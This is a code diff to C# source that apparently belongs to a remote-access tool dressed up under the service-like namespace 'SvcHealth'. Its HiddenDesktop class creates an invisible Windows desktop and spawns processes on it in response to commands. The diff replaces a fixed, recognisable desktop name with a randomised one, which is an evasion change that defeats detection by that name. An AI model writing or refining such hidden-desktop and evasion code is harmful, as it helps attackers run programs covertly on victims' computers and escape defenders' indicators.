@@ -7,6 +7,7 @@ namespace SvcHealth
     static class HiddenDesktop
     {
         static IntPtr desk;
+        static string deskName;
 
         public static string Handle(string command)
         {
@@ -31,15 +32,16 @@ namespace SvcHealth
         static bool Ensure()
         {
             if (desk != IntPtr.Zero) return true;
-            desk = CreateDesktopW("SockPuppetsHD", null, IntPtr.Zero, 0, 0x10000000, IntPtr.Zero);
-            if (desk == IntPtr.Zero) desk = OpenDesktopW("SockPuppetsHD", 0, false, 0x10000000);
+            deskName = "d" + System.Diagnostics.Stopwatch.GetTimestamp().ToString("x");
+            desk = CreateDesktopW(deskName, null, IntPtr.Zero, 0, 0x10000000, IntPtr.Zero);
+            if (desk == IntPtr.Zero) desk = OpenDesktopW(deskName, 0, false, 0x10000000);
             return desk != IntPtr.Zero;
         }
 
         static string Start(string exe)
         {
             if (!Ensure() || !SetThreadDesktop(desk)) return "desktop open failed";
-            var si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>(), lpDesktop = "WinSta0\\SockPuppetsHD", dwFlags = 1, wShowWindow = 5 };
+            var si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>(), lpDesktop = "WinSta0\\" + deskName, dwFlags = 1, wShowWindow = 5 };
             if (!CreateProcessW(null, exe, IntPtr.Zero, IntPtr.Zero, false, 0x10, IntPtr.Zero, null, ref si, out var pi))
                 return "spawn failed";
             CloseHandle(pi.hProcess);
